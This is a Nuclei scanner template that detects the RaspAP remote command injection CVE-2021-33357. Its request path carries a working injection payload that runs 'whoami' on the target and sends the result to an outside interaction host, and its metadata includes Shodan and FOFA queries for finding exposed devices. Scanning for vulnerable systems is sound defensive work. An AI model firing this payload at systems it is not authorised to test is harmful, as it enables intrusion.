http:
- extractors:
  - group: 1
    part: interactsh_request
    regex:
    - GET \/([a-z-]+) HTTP
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - type: word
    words:
    - DHCPEnabled
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/ajax/networking/get_netcfg.php?iface=;curl%20{{interactsh-url}}/`whoami`;'
id: CVE-2021-33357
info:
  author: pikpikcu,pdteam
  classification:
    cpe: cpe:2.3:a:raspap:raspap:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-33357
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.99883
    epss-score: 0.94007
  description: 'RaspAP 2.6 to 2.6.5 allows unauthenticated attackers to execute arbitrary
    OS commands via the "iface" GET parameter in /ajax/networking/get_netcfg.php,
    when the "iface" parameter value contains special characters such as ";".

    '
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    remote code execution, compromising the integrity and confidentiality of the affected
    system.

    '
  metadata:
    fofa-query: icon_hash=-1465760059
    max-request: 1
    product: raspap
    shodan-query: http.favicon.hash:-1465760059
    vendor: raspap
  name: RaspAP <=2.6.5 - Remote Command Injection
  reference:
  - https://checkmarx.com/blog/chained-raspap-vulnerabilities-grant-root-level-access/
  - https://gist.github.com/omriinbar/52c000c02a6992c6ce68d531195f69cf
  - https://github.com/RaspAP/raspap-webgui
  - https://nvd.nist.gov/vuln/detail/CVE-2021-33357
  - https://github.com/20142995/Goby
  remediation: 'Upgrade RaspAP to a version higher than 2.6.5 to mitigate the vulnerability.

    '
  severity: critical
  tags: cve2021,cve,rce,raspap,oast,vkev,vuln
